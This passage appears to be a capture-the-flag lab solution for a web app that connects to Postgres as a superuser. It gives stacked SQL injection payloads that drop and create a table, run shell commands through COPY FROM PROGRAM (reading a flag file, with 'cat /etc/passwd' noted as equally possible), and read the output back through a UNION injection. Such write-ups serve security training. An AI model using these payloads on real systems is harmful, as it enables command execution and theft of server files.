`usesuper` is `t` — the app connects as a superuser. A superuser can run
`COPY <table> FROM PROGRAM '<shell command>'`, which executes the command on the
database server and loads its stdout into the table.

Through the **ingest** sink (stacked), plant and fill a loot table:

```
source = x', 'web'); DROP TABLE IF EXISTS loot; CREATE TABLE loot(o text);
         COPY loot FROM PROGRAM 'cat /labflag/flag.txt'; --
```

That runs `cat /labflag/flag.txt` inside the Postgres container and stores the flag
in `loot`. Then read it back through the **visible** sink:

```
GET /metrics?category=' UNION SELECT 1, o, 1 FROM loot --
```

The flag appears as the `name` field of the UNION row. Submit it with
`POST /solve {"flag":"FLAG{...}"}`. (Any command works — `id`, `ls -la /`,
`cat /etc/passwd` — the flag file just happens to be the target here.)
